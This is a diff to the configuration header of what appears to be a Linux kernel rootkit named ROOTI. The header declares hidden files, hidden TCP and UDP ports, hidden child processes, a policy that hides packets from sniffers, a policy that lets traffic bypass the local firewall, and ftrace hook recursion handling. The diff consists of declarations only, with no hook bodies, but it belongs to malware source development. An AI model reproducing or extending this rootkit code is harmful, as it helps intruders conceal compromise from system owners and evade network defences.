@@ -1,9 +1,9 @@
 #ifndef _ROOTI_CONFIG_H
 #define _ROOTI_CONFIG_H
 
-#include <linux/types.h> 
+#include <linux/types.h>
 #include <linux/filter.h>
-#include "capabilities/fw_bypass.h"
+#include "policy.h"
 
 // Names of files that should be hidden
 extern const char *ROOTI_HIDDEN_FILES[];
@@ -29,17 +29,15 @@ extern const size_t ROOTI_HIDDEN_TCP_PORTS_COUNT;
 extern const unsigned short ROOTI_HIDDEN_UDP_PORTS[];
 extern const size_t ROOTI_HIDDEN_UDP_PORTS_COUNT;
 
-// BPF program for filtering out hidden network traffic from sniffers
-// The program can be obtained by executing: tcpdump -dd '<filter>'
-extern struct sock_filter ROOTI_BPF_FILTER_PROGRAM[];
-extern const size_t ROOTI_BPF_FILTER_PROGRAM_COUNT;
+// Set of network rules that define which packets should be hidden from sniffers.
+extern const struct rooti_net_policy ROOTI_PCAP_POLICY;
 
-// Set of network rules to enforce. These rules will apply regardless
-// of a any local firewall. Unspecified fields get treated as "match all values".
-extern const struct rooti_net_policy ROOTI_NET_POLICY;
+// Set of network rules that define which packets should bypass the local firewall.
+// These rules will apply regardless of any other netfilter hooks installed.
+extern const struct rooti_net_policy ROOTI_FW_POLICY;
 
-/* 
- * Recursion loops protection mechanism - often times hooked functions call 
+/*
+ * Recursion loops protection mechanism - often times hooked functions call
  * their original predecessor. The call to the original kernel function would trigger the
  * ftrace callback, which would in turn point to the hook function, which would call the original function
  * and so on and so forth. We've got two ways to handle this:
@@ -55,11 +53,11 @@ extern const struct rooti_net_policy ROOTI_NET_POLICY;
 // This flag should only be set for debugging purposes
 #define ROOTI_DEBUG_SHOWME
 
+// Indicates whether child processes should be hidden along with the parent
+#define ROOTI_HIDE_CHILD_PROCS
+
 // Indicates whether logging is enabled.
 // This flag should only be set for debugging purposes
 #define ROOTI_DEBUG_LOGGING
-
-// Indicates whether child processes should be hidden along with the parent
-#define ROOTI_HIDE_CHILD_PROCS
 
 #endif
